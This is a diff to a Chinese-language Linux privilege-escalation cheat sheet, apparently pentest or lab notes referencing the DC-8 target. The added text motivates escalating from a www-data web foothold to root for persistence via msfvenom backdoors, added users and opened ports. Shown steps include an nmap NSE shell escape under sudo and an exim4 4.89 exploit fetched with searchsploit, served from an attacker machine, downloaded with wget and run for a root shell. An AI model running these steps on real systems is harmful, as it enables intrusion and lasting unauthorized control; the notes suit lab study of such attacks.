@@ -4,6 +4,11 @@
 
 提权本质：一方面是信息收集，另一方面是对内核漏洞的掌握情况
 
+
+**为什么要提权**
+当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一下命令或者读取/root 下的重要文件。这个时候就需要提权，在root 权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。
+
+提权思路：大概思路是通过信息搜集查找可利用的文件/脚本/软件/用户/内核漏洞/恶意劫持/特定平台漏洞/框架漏洞/组件/等，写入或执行恶意命令/脚本/shell/添加高权限用户，提权成功，然后进一步利用。
 ## 基础信息收集
 
 ### 内核，操作系统，设备信息
@@ -235,6 +240,27 @@ nmap -v
 echo 'os.execute("/bin/sh")' > /tmp/root.nse
 cat /tmp/root.nse
 sudo nmap --script=/tmp/root.nse
+whoami
+```
+
+#### exim4提权
+
+具体案例参考DC-8
+
+查看exim4版本号
+```bash
+/usr/sbin/exim4 --version # 4.89
+searchsploit exim 4.89
+searchsploit -m 46996 #注意在kali上把文件改为unix格式
+
+vi 46996.sh
+:!set ff=unix
+
+python -m SimpleHTTPServer  8080 # kali
+cd /tmp # 靶机在tmp目录下进行下载接受，防止其他位子没有权限
+wget http://10.30.0.81:8080/46996.sh # 靶机
+chmod +x 46996.sh
+./46996.sh -m netcat
 whoami
 ```
 
